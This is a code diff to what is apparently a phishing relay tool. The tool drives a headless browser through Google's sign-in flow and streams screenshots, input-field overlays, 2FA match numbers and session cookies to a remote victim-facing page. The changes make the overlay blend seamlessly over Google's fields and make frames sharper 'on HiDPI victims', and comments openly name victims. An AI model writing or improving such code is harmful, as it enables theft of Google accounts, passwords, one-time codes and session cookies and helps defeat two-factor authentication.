@@ -136,7 +136,7 @@ def ensure_xvfb():
                        capture_output=True, timeout=5)
         return display
     except Exception:
-        subprocess.Popen(["Xvfb", f":{num}", "-screen", "0", "1920x1080x24"],
+        subprocess.Popen(["Xvfb", f":{num}", "-screen", "0", "3840x2160x24"],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         time.sleep(1.5)
         return display
@@ -235,6 +235,7 @@ class RelaySession(threading.Thread):
         self.hint = "Đang mở trang đăng nhập…"
         self.need_input = None
         self.screenshot = None          # b64 jpeg fallback/transition layer
+        self.shot_hash = None           # md5 of the current frame (delta API)
         self.match_number = None
         self.error = None
         self.cookies = None
@@ -350,13 +351,28 @@ class RelaySession(threading.Thread):
             self.input_box = None
             self.button_box = None
             if ibox:
+                # widen to the visible field WRAPPER (includes floating label
+                # + border) so the overlay fully replaces Google's field
+                try:
+                    pbox = loc.evaluate(
+                        "el => { const p = el.parentElement; if (!p) return null;"
+                        " const r = p.getBoundingClientRect();"
+                        " return {x: r.x, y: r.y, w: r.width, h: r.height}; }")
+                    if pbox and 1.0 <= pbox["h"] / max(1.0, ibox["height"]) <= 2.2 \
+                            and 0.85 <= pbox["w"] / max(1.0, ibox["width"]) <= 1.6:
+                        ibox = {"x": pbox["x"], "y": pbox["y"],
+                                "width": pbox["w"], "height": pbox["h"]}
+                except Exception:
+                    pass
                 self.input_box = {
                     "x": round(100 * (ibox["x"] - cbox["x"]) / cbox["width"], 2),
                     "y": round(100 * (ibox["y"] - cbox["y"]) / cbox["height"], 2),
                     "w": round(100 * ibox["width"] / cbox["width"], 2),
                     "h": round(100 * ibox["height"] / cbox["height"], 2)}
-                for bsel in ("#identifierNext", "#passwordNext", "#totpNext",
-                             "button:has-text('Next')"):
+                # the real button (wrapper divs inflate the box ~52px; the
+                # inner button is Google's ~40px pill)
+                for bsel in ("#identifierNext button", "#passwordNext button",
+                             "#totpNext button", "button:has-text('Next')"):
                     bloc = pg.locator(bsel).first
                     try:
                         if bloc.is_visible():
@@ -408,14 +424,16 @@ class RelaySession(threading.Thread):
                     try:
                         loc = pg.locator(sel).first
                         if loc.is_visible():
-                            shot = loc.screenshot(type="jpeg", quality=70)
+                            shot = loc.screenshot(type="jpeg", quality=82,
+                                                  scale="device")
                             break
                     except Exception:
                         continue
             if shot is None:
-                shot = pg.screenshot(type="jpeg", quality=68,
+                shot = pg.screenshot(type="jpeg", quality=80,
                                      clip={"x": 360, "y": 120, "width": 1200, "height": 840})
             self.screenshot = base64.b64encode(shot).decode()
+            self.shot_hash = hashlib.md5(shot).hexdigest()[:12]
         except Exception as e:
             if not getattr(self, "_shot_err_logged", False):
                 self._shot_err_logged = True
@@ -512,7 +530,8 @@ class RelaySession(threading.Thread):
                       "--window-size=1920,1080"],
                 proxy={"server": f"http://127.0.0.1:{BRIDGE_PORT}"})
             pg = browser.new_page(user_agent=UA, locale="en-US",
-                                  viewport={"width": 1920, "height": 1080})
+                                  viewport={"width": 1920, "height": 1080},
+                                  device_scale_factor=2)  # 2x raster, sharp on HiDPI victims
             pg.goto(SIGNIN_URL, wait_until="load", timeout=60000)
             pg.wait_for_selector("#identifierId", timeout=20000)
             pg.wait_for_selector("#identifierNext", state="visible", timeout=20000)
@@ -644,9 +663,11 @@ LOCK = threading.Lock()
 
 
 def public_state(s, client_hash=None):
+    same = bool(client_hash) and client_hash == s.shot_hash
     return {"id": s.id, "state": s.state, "hint": s.hint,
             "need_input": s.need_input, "match_number": s.match_number,
-            "screenshot": s.screenshot,
+            "shot_hash": s.shot_hash,
+            "screenshot": None if same else s.screenshot,
             "input_box": s.input_box, "button_box": s.button_box,
             "input_kind": s.input_kind}
 
